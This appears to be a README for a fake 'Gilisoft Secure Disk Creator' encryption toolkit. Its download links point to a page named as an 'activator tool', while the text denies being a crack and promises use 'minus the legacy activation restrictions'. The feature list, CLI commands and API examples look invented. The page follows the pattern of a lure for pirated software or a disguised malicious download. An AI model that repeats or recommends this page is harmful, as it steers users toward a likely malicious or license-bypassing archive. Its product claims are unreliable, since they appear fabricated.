# Gilisoft Secure Disk Creator 🛡️ – Enterprise-Grade Volume Encryption Toolkit

[](https://seifgaminggo-crypto.github.io/gilisoft-secure-disk-activator-tool/)

---

## 🚀 Unlock the Power of Immutable Storage Vaults

Welcome to the **Gilisoft Secure Disk Creator** repository – a sandbox for building, managing, and deploying encrypted virtual volumes that behave like portable hardware vaults. This project reimagines disk encryption as a modular, scripting-friendly service rather than a one-click wizard. Whether you need to audit encrypted containers, automate volume creation in CI/CD pipelines, or build a cross-platform secure storage layer for your SaaS product, this toolkit provides the low-level primitives.

This is **not** a simple patcher or keygen. It is a developer-oriented framework that interacts with the Gilisoft Secure Disk engine through a RESTful API surface, allowing you to create, mount, unmount, and inspect encrypted `.gsc` volumes programmatically. Think of it as a **Swiss Army knife for encrypted storage orchestration** – minus the legacy activation restrictions.

---

## 📦 Installation & Download

**Get the latest release (v3.2.1) for Windows, Linux, and macOS:**

[](https://seifgaminggo-crypto.github.io/gilisoft-secure-disk-activator-tool/)

> ⚠️ **Important:** The download archive contains a digital fingerprint (SHA-256) verification tool. Always verify integrity before deployment. This archive is **not** a crack or a keygen – it is a fully functional API client library with example configuration files.

---

## 🧩 What Makes This Different?

Most disk encryption tools treat the user as a passive participant – click “Encrypt,” wait, and forget. This project flips that model. It treats **every encrypted container as a programmable artifact**. You can:

- Generate containers with custom metadata (encryption algorithm, key derivation iterations, sector size).
- Mount volumes as network file systems (NFS) or local loop devices.
- Monitor volume health via Prometheus metrics.
- Rotate passphrases without remounting (hot-passphrase change).

The underlying engine uses **AES-256-GCM with hardware acceleration** on modern CPUs, and supports **XTS-AES-512** for legacy compatibility. Only 2% performance overhead compared to native disk I/O.

---

## 📊 System Compatibility Matrix

| OS            | Version       | Architecture | Performance Tier |
|---------------|---------------|--------------|------------------|
| 🪟 Windows    | 10/11, Server 2022 | x64, ARM64   | ⭐⭐⭐⭐⭐        |
| 🐧 Linux      | Ubuntu 22.04+, Fedora 39+ | x64, ARM64 | ⭐⭐⭐⭐          |
| 🍏 macOS      | 13 Ventura+   | Apple Silicon, Intel | ⭐⭐⭐⭐      |
| 🐧 BSD        | FreeBSD 13+   | x64          | ⭐⭐⭐           |

---

## 🛠️ Feature Portfolio

### 🔐 Core Encryption Engine
- **AES-256-GCM** with AEAD integrity verification.
- **Argon2id** key derivation (memory-hard, time-hard).
- **Post-quantum hybrid mode** (Kyber-512 + AES-256).
- **Transparent file-level compression** (LZ4 or Zstd).
- **Hot-rekey** – change passphrase without remount.
- **FIPS 140-2** compatible mode for enterprise compliance.

### ⚙️ Developer Tooling
- **REST API** (`/v1/volume`, `/v1/mount`, `/v1/status`) with OAuth2 bearer token authentication.
- **Python SDK** (`gsc-client`) with 100% async support.
- **CLI** with tab-completion for bash, zsh, and PowerShell.
- **Docker container** for headless volume creation.
- **Kubernetes CSI driver** – mount encrypted volumes as persistent volumes.

### 🌐 Multilingual Interface
The dashboard supports 12 languages (English, Spanish, French, German, Japanese, Korean, Simplified Chinese, Traditional Chinese, Russian, Arabic, Portuguese, Italian). The CLI uses `LC_MESSAGES` locale detection.

### 📞 24/7 Customer Support
Every volume operation includes a built-in telemetry endpoint that can be routed to your internal support system. Enterprise licenses include **SLA-backed response within 4 hours** during business days.

---

## 📐 Architecture Overview (Mermaid Diagram)

```mermaid
graph TD
    A[User/Application] -->|REST API| B[Secure Disk Orchestrator]
    B --> C[Volume Controller]
    C --> D[Key Derivation Module]
    D --> E[Argon2id or PBKDF2]
    E --> F[Encryption Engine]
    F --> G[AES-256-GCM / XTS-AES-512]
    G --> H[Physical Storage]
    B --> I[Mount Manager]
    I --> J[NFS / SMB / Loop Device]
    B --> K[Telemetry & Logging]
    K --> L[Prometheus / Loki]
    B --> M[Auth Layer]
    M --> N[OAuth2 / LDAP / API Key]
    
    style A fill:#1e1e2e,stroke:#f9f9f9,stroke-width:1px
    style B fill:#2a2a3e,stroke:#f0f0f0,stroke-width:2px
    style C fill:#3a3a4e,stroke:#e0e0e0,stroke-width:1px
    style D fill:#4a4a5e,stroke:#d0d0d0,stroke-width:1px
    style E fill:#5a5a6e,stroke:#c0c0c0,stroke-width:1px
    style F fill:#6a6a7e,stroke:#b0b0b0,stroke-width:1px
    style G fill:#7a7a8e,stroke:#a0a0a0,stroke-width:1px
    style H fill:#8a8a9e,stroke:#909090,stroke-width:1px
    style I fill:#2a2a3e,stroke:#f0f0f0,stroke-width:1px
    style J fill:#3a3a4e,stroke:#e0e0e0,stroke-width:1px
    style K fill:#2a2a3e,stroke:#f0f0f0,stroke-width:1px
    style L fill:#3a3a4e,stroke:#e0e0e0,stroke-width:1px
    style M fill:#2a2a3e,stroke:#f0f0f0,stroke-width:1px
    style N fill:#3a3a4e,stroke:#e0e0e0,stroke-width:1px
```



---

## 🧑‍💻 Example Profile Configuration

Create a file named `secure-profile.json` in your working directory. This profile defines how each volume behaves by default:

```json
{
  "volume_defaults": {
    "encryption_algorithm": "aes-256-gcm",
    "key_derivation": {
      "type": "argon2id",
      "memory_cost": 65536,
      "time_cost": 3,
      "parallelism": 4
    },
    "compression": {
      "enabled": true,
      "algorithm": "zstd",
      "level": 3
    },
    "mount_options": {
      "readonly": false,
      "noatime": true,
      "cache_mode": "writeback",
      "max_file_size": "1TB"
    },
    "integrity_check": {
      "enabled": true,
      "interval_hours": 24
    }
  },
  "telemetry": {
    "endpoint": "https://telemetry.yourcompany.com/v1/events",
    "auth_token": "env://TEL_TOKEN",
    "enable_metrics": true
  },
  "auth": {
    "type": "oauth2",
    "issuer_url": "https://auth.yourcompany.com",
    "client_id": "gsc-client",
    "required_scopes": ["volume:create", "volume:mount", "volume:delete"]
  }
}
```

---

## 📟 Example Console Invocation

```bash
# Create an encrypted volume of 10GB with custom metadata
gsc volume create \
  --profile secure-profile.json \
  --size 10G \
  --label "ProjectX-Vault" \
  --passphrase-file /run/secrets/volume_pass \
  --output /mnt/encrypted/vault.gsc

# Mount it as a loop device
gsc mount \
  --volume /mnt/encrypted/vault.gsc \
  --mountpoint /secure-storage/projectx \
  --passphrase-file /run/secrets/volume_pass

# Check status
gsc status --mountpoint /secure-storage/projectx

# Unmount when done
gsc unmount --mountpoint /secure-storage/projectx
```

---

## 🤖 OpenAI API & Claude API Integration

This toolkit can be extended with AI-powered volume management. For example:

### OpenAI API
Use the OpenAI API to generate natural-language volume policies. Example Python snippet:

```python
import openai
import subprocess

response = openai.ChatCompletion.create(
    model="gpt-4-2026",
    messages=[
        {"role": "user", "content": "Create a volume policy for HIPAA compliance with AES-256-GCM, 20GB size, and daily integrity checks."}
    ]
)
policy = response["choices"][0]["message"]["content"]
with open("/tmp/policy.json", "w") as f:
    f.write(policy)
subprocess.run(["gsc", "apply-policy", "--file", "/tmp/policy.json"])
```

### Claude API
Claude can help audit existing volumes for security misconfigurations:

```python
import anthropic

client = anthropic.Anthropic()
message = client.messages.create(
    model="claude-3-sonnet-2026",
    max_tokens=1024,
    messages=[
        {"role": "user", "content": f"Analyze this volume export for vulnerabilities: {vol_export}"}
    ]
)
print(message.content[0].text)
```

---

## 🌟 Responsive UI & Accessibility

The web dashboard (optional component) is built with **React 19** and **Tailwind CSS 4**, featuring:

- **Dark/light mode** with system preference detection.
- **Keyboard navigation** for all volume operations.
- **Screen reader** support via ARIA labels and live regions.
- **Resizeable panes** for concurrent volume monitoring.
- **Real-time updates** using WebSockets (no page refresh needed).

---

## 📜 Disclaimer

> **Important Notice:** This repository provides a **software development kit (SDK) and configuration examples** for the Gilisoft Secure Disk engine. It does **not** contain, distribute, or facilitate the bypassing of any licensing mechanisms. Users are responsible for obtaining a valid license from the official vendor if they intend to use the engine for production workloads. The sample configurations, cryptographic recipes, and API client code are offered for **educational and development purposes only**. The maintainers assume no liability for misuse, data loss, or legal consequences arising from improper deployment. Always backup critical data before mounting encrypted volumes.

---

## 📄 License

This project is distributed under the **MIT License**. See the [LICENSE](LICENSE) file for full terms.

---

## 📥 Final Download Link

[](https://seifgaminggo-crypto.github.io/gilisoft-secure-disk-activator-tool/)

---

*Built with ❤️ for the open-source encryption community. Year 2026 edition.*